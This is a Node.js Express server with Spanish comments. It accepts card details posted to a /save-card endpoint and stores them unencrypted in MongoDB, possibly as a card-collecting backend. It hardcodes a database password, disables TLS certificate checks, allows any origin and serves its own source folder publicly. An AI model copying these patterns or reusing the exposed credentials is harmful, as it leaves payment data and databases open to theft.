// server.js
const express = require('express');
const { MongoClient } = require('mongodb'); 
const cors = require('cors'); 
const app = express();

const serverPort = process.env.PORT || 3000;

// =================================================================
// CONFIGURACIÓN FINAL DE MONGODB
// =================================================================

// ⚠️ CADENA DE CONEXIÓN ACTUALIZADA con las nuevas credenciales
const uri = "mongodb+srv://maxuel:Maxuel09@cluster0.dfxcysb.mongodb.net/?retryWrites=true&w=majority";

const client = new MongoClient(uri, {
    serverSelectionTimeoutMS: 5000,
    tls: true,
    tlsInsecure: true // Mantenemos la compatibilidad SSL forzada para Render
});

app.use(cors()); 
app.use(express.json());

// =================================================================
// 1. ENDPOINT DE GUARDADO DE TARJETA EN MONGODB
// =================================================================

app.post('/save-card', async (req, res) => {
    const cardData = req.body;
    
    const logEntry = {
        ...cardData, 
        timestamp: new Date()
    };
    
    try {
        // Conexión
        await client.connect(); 
        
        const database = client.db("inventario_db"); 
        const collection = database.collection("tarjetas"); 
        
        await collection.insertOne(logEntry);

        console.log(`✅ Tarjeta (${cardData.tipo_tarjeta}) guardada para: ${cardData.email}`);
        res.status(200).send({ message: 'Datos recibidos y guardados con éxito en la DB.' });

    } catch (error) {
        console.error('❌ Error al guardar en MongoDB:', error);
        res.status(500).send({ message: 'Error interno del servidor al conectar con la base de datos.' });
    } finally {
        // Cierre de conexión
        await client.close();
    }
});


// =================================================================
// 2. SERVIR ARCHIVOS ESTÁTICOS 
// =================================================================
app.use(express.static(__dirname)); 


// =================================================================
// 3. INICIAR EL SERVIDOR
// =================================================================
app.listen(serverPort, () => {
    console.log(`Servidor de inventario iniciado y escuchando en el puerto ${serverPort}`);
    console.log(`¡Despliegue verificado!`);
});
